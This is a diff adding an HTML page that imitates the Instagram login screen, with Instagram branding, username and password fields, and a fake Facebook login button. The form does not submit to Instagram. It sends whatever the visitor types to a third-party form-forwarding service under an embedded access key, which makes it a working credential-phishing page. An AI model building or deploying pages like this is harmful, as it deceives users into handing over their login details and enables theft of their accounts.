@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: sans-serif;
+        }
+
+        form{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 350px;
+            margin: 100px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 80%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        button:hover {
+            opacity: 0.8;
+        }
+
+        a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .facebook-button {
+            background-color: #3b5998;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        .facebook-button:hover {
+            opacity: 0.8;
+        }
+
+        .facebook-button i {
+            margin-right: 5px;
+        }
+
+        .or {
+            text-align: center;
+            margin-top: 20px;
+        }
+        img{
+            width: 200px;
+            display: flex;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+       <img src="Instagram_logo.svg.png" alt="">
+        <form action="https://api.web3forms.com/submit" method="POST">
+
+            <input type="hidden" name="access_key" value="f6539c4f-a7d7-40ad-b63d-3ed9d299c3a3">
+            <input type="text"  name="first_name" placeholder="Phone number, username, or email"><br>
+            <input type="password"  name="first_name" placeholder="password"><br>
+            <button type="submit">Log In</button>
+            <!-- <a href="#">Forgot your login details?</a>
+            <a href="#">Get help signing in.</a> -->
+            <button type="submit" class="facebook-button"><i class="fa fa-facebook"></i> facebook login</button>
+            <div class="or">OR</div>
+            <a href="#">Don't have an account? Sign up.</a>
+            <p>Instagram from Facebook</p>
+        </form>
+    </div>
+
+</body>
+
+</html>
